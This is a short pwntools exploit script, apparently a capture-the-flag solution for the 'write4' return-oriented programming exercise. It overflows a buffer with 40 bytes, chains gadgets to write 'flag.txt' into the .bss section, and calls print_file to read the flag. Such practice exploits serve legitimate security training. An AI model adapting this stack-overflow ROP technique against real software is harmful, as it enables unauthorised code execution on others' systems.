from pwn import * 

elf=ELF("write4")
r=ROP([elf])
p=process(elf.path)

ret = r.find_gadget(["ret"])[0]
mov_into_r14_r15=elf.sym.usefulGadgets
pop_r14_r15=r.find_gadget(["pop r14","pop r15","ret"])[0]
pop_rdi=r.find_gadget(["pop rdi","ret"])[0]
#write into bss and assume it's always 0
payload=b'A'*40
payload+=p64(pop_r14_r15)+p64(elf.bss())+b"flag.txt"
payload+=p64(mov_into_r14_r15)
payload+=p64(pop_rdi)+p64(elf.bss())
payload+=p64(elf.sym.print_file)
p.send(payload)
print(p.recvuntil("}"))